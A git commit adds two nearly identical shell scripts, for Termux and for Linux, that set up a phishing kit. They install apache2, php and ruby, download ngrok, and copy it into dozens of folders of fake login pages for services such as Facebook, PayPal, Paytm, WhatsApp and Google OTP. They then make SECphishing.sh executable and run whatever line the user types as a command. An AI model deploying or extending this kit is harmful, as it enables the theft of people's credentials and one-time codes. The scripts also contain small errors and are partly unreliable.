39088e61f89f34b892182afa5ae21b266b653924
Termux2 <49311302+Termux2@users.noreply.github.com>
2020-09-09 11:21:15 +0000

    Add files via upload

---
+++ Mobile.sh
@@ -0,0 +1,79 @@
+#!/bin/bash
+echo ""
+clear
+echo ""
+echo ""
+echo ""
+echo ""
+echo -e $'\e[1;37m[\e[1;37m\e[1;37m+\e[1;37m\e[1;37m]\e[1;37m\e[1;37m!!! PLEASE ENTER NGROK !!! \e[1;37m'
+sleep 2
+clear
+echo ""
+echo ""
+echo -e $'\e[1;37m\e[1;37m\e[1;37m\e[1;37m\e[1;37m\e[1;37m\e[1;37m   ----------------------------------------  \e[1;37m\e[1;37m'
+echo -e $'\e[1;37m\e[1;37m\e[1;37m\e[1;37m\e[1;37m\e[1;37m\e[1;37m  !!         DOWNLOAD REQUIREMENTS         !!\e[1;37m'
+echo -e $'\e[1;37m\e[1;37m\e[1;37m\e[1;37m\e[1;37m\e[1;37m\e[1;37m   ----------------------------------------- \e[1;37m\e[1;37m'
+echo ""
+termux-setup-storage
+sudo apt-get install apache2 -y
+apt install 
+apt install ruby -y
+apt install php -y
+apt install jq -y
+apt install tail -y
+apt install curl -y
+apt install zip -y
+pkg install wget -y
+pkg install ruby -y
+pkg install gem -y
+gem install lolcat
+clear
+wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip --no-check-certificate
+unzip ngrok-stable-linux-arm.zip
+cp -R ngrok HACKER sites/github/
+cp -R ngrok HACKER sites/Hotstar-otp-bypass/
+cp -R ngrok HACKER sites/instagram/
+cp -R ngrok HACKER sites/Linkedin/
+cp -R ngrok HACKER sites/Netflix/
+cp -R ngrok HACKER sites/Paytm-Phishing/paytm/
+cp -R ngrok HACKER sites/Paytm-Phishing/signup/
+cp -R ngrok HACKER sites/spotify/
+cp -R ngrok HACKER sites/whatsapp-phishing/
+cp -R ngrok HACKER sites/facebook/
+cp -R ngrok HACKER sites/google-otp/
+cp -R ngrok HACKER sites/instafollow/
+cp -R ngrok HACKER sites/ipfinder/
+cp -R ngrok HACKER sites/ola-otpbypass/
+cp -R ngrok HACKER sites/UberEats-Phishing/
+cp -R ngrok HACKER sites/Zomato-Phishing/
+cp -R ngrok HACKER sites/amazonsign/
+cp -R ngrok HACKER sites/tiktok/
+cp -R ngrok HACKER sites/phonepay/
+cp -R ngrok HACKER sites/paypal/
+cp -R ngrok HACKER sites/telegram/
+cp -R ngrok HACKER sites/twitter/
+cp -R ngrok HACKER sites/flipcart/
+cp -R ngrok HACKER sites/wordpress/
+cp -R ngrok HACKER sites/snapchat/
+cp -R ngrok HACKER sites/protonmail/
+cp -R ngrok HACKER sites/stackoverflow/
+cp -R ngrok HACKER sites/ebay/
+cp -R ngrok HACKER sites/twitch/
+cp -R ngrok HACKER sites/ajio/
+cp -R ngrok HACKER sites/cryptocurrency/
+cp -R ngrok HACKER sites/mobikwik/
+cp -R ngrok HACKER sites/pinterest/
+chmod +x SECphishing.sh
+clear
+echo ""
+echo -e $'\e[1;37m[\e[1;37m\e[1;37m *** \e[1;37m\e[1;37m]\e[1;37m\e[1;37m KEEP IN MIND YOU HAVE TO ENTER  \e[1;37m[ *** ]\e[1;37m'
+echo ""
+read -p $'\e[1;37m[\e[1;37m\e[1;37m+\e[1;37m\e[1;37m]\e[1;37m\e[1;37m CANNOT GET ANY LINK WITHOUT NGROK TOKEN [Ex. ./ngrok authtoken 1Y7IU ] : \e[1;37m' token
+$token
+sleep2
+clear
+echo -e $'\e[1;37m\e[1;37m\e[1;37m\e[1;37m\e[1;37m\e[1;37m\e[1;37m  ---------------------------------   \e[1;37m\e[1;37m'
+echo -e $'\e[1;37m\e[1;37m\e[1;37m\e[1;37m\e[1;37m\e[1;37m\e[1;37m !!    Installation Successfull   !!  \e[1;37m\e[1;37m'
+echo -e $'\e[1;37m\e[1;37m\e[1;37m\e[1;37m\e[1;37m\e[1;37m\e[1;37m  ---------------------------------   \e[1;37m\e[1;37m'
+sleep 4
+clear
---
+++ linux-setup.sh
@@ -0,0 +1,75 @@
+#!/bin/bash
+echo ""
+clear
+echo ""
+echo ""
+echo -e $'\e[1;37m[\e[1;37m\e[1;37m+\e[1;37m\e[1;37m]\e[1;37m\e[1;37m!!! PLEASE ENTER NGROK !!! \e[1;37m'
+sleep 2
+clear
+echo ""
+echo ""
+echo -e $'\e[1;37m\e[1;37m\e[1;37m\e[1;37m\e[1;37m\e[1;37m\e[1;37m   ----------------------------------------  \e[1;37m\e[1;37m'
+echo -e $'\e[1;37m\e[1;37m\e[1;37m\e[1;37m\e[1;37m\e[1;37m\e[1;37m  !!         DOWNLOAD REQUIREMENTS         !!\e[1;37m'
+echo -e $'\e[1;37m\e[1;37m\e[1;37m\e[1;37m\e[1;37m\e[1;37m\e[1;37m   ----------------------------------------- \e[1;37m\e[1;37m'
+echo ""
+echo ""
+sudo apt-get install apache2 -y
+apt install php -y
+apt install tail -y
+apt install curl -y
+systemctl start apache2
+apt install ruby -y
+apt-get install ruby -y
+apt install gem -y
+gem install lolcat
+apt install gnome-terminal -y
+clear
+wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip --no-check-certificate
+unzip ngrok-stable-linux-amd64.zip
+cp -R ngrok HACKER sites/github/
+cp -R ngrok HACKER sites/Hotstar-otp-bypass/
+cp -R ngrok HACKER sites/instagram/
+cp -R ngrok HACKER sites/Linkedin/
+cp -R ngrok HACKER sites/Netflix/
+cp -R ngrok HACKER sites/Paytm-Phishing/paytm/
+cp -R ngrok HACKER sites/Paytm-Phishing/signup/
+cp -R ngrok HACKER sites/spotify/
+cp -R ngrok HACKER sites/whatsapp-phishing/
+cp -R ngrok HACKER sites/facebook/
+cp -R ngrok HACKER sites/google-otp/
+cp -R ngrok HACKER sites/instafollow/
+cp -R ngrok HACKER sites/ipfinder/
+cp -R ngrok HACKER sites/ola-otpbypass/
+cp -R ngrok HACKER sites/UberEats-Phishing/
+cp -R ngrok HACKER sites/Zomato-Phishing/
+cp -R ngrok HACKER sites/amazonsign/
+cp -R ngrok HACKER sites/tiktok/
+cp -R ngrok HACKER sites/phonepay/
+cp -R ngrok HACKER sites/paypal/
+cp -R ngrok HACKER sites/telegram/
+cp -R ngrok HACKER sites/twitter/
+cp -R ngrok HACKER sites/flipcart/
+cp -R ngrok HACKER sites/wordpress/
+cp -R ngrok HACKER sites/snapchat/
+cp -R ngrok HACKER sites/protonmail/
+cp -R ngrok HACKER sites/stackoverflow/
+cp -R ngrok HACKER sites/ebay/
+cp -R ngrok HACKER sites/twitch/
+cp -R ngrok HACKER sites/ajio/
+cp -R ngrok HACKER sites/cryptocurrency/
+cp -R ngrok HACKER sites/mobikwik/
+cp -R ngrok HACKER sites/pinterest/
+chmod +x SECphishing.sh
+clear
+echo ""
+echo -e $'\e[1;37m[\e[1;37m\e[1;37m *** \e[1;37m\e[1;37m]\e[1;37m\e[1;37m KEEP IN MIND YOU HAVE TO ENTER  \e[1;37m[ *** ]\e[1;37m'
+echo ""
+read -p $'\e[1;37m[\e[1;37m\e[1;37m+\e[1;37m\e[1;37m]\e[1;37m\e[1;37m CANNOT GET ANY LINK WITHOUT NGROK TOKEN [Ex. ./ngrok authtoken 1Y7IU ] : \e[1;37m' token
+$token
+sleep2
+clear
+echo -e $'\e[1;37m\e[1;37m\e[1;37m\e[1;37m\e[1;37m\e[1;37m\e[1;37m  ---------------------------------   \e[1;37m\e[1;37m'
+echo -e $'\e[1;37m\e[1;37m\e[1;37m\e[1;37m\e[1;37m\e[1;37m\e[1;37m !!    Installation Successfull   !!  \e[1;37m\e[1;37m'
+echo -e $'\e[1;37m\e[1;37m\e[1;37m\e[1;37m\e[1;37m\e[1;37m\e[1;37m  ---------------------------------   \e[1;37m\e[1;37m'
+sleep 4
+clear
